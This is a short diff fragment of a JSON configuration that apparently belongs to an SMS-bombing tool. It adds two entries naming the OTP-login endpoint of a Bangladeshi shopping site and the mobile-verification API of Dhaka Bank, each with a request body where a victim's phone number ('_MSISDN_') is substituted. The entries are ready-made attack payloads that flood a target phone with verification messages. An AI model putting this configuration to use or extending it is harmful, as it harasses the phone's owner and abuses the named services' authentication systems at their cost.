@@ -357,6 +357,23 @@
         }
     },
     {
-        "name":"Unknown"
+        "name":"TheMallBD",
+        "config":{
+            "url":"https://themallbd.com/api/auth/otp_login",
+            "method":"post",
+            "headers":{"content-type":"application\/json"},
+            "body":"{\"phone_number\":\"+880_MSISDN_\"}",
+            "useProxy":false
+        }
+    },
+    {
+        "name":"DHAKA BANK",
+        "config":{
+            "url":"https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber",
+            "method":"post",
+            "headers":{"content-type":"application\/json"},
+            "body":"{\"AccessToken\":\"\",\"TrackingNo\":\"\",\"mobileNo\":\"0_MSISDN_\",\"otpSms\":\"\",\"product_id\":\"250\",\"requestChannel\":\"MOB\",\"trackingStatus\":5}",
+            "useProxy":false
+        }
     }
 ]
